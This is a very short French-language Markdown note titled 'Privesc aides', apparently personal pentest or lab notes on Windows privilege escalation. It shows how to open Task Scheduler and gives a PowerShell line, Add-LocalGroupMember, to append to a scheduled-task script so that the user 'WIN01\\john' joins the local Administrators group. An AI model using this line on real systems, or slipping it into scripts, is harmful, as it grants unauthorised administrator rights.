
# Privesc aides

## task scheduler

```
Windows + R
taskschd.msc
```

## ajout dans le groupe administrator via un script lancé avec le task scheduler

a la fin du script on ajoute

``` powershell
Add-LocalGroupMember -Group "Administrators" -Member "WIN01\\john"
```
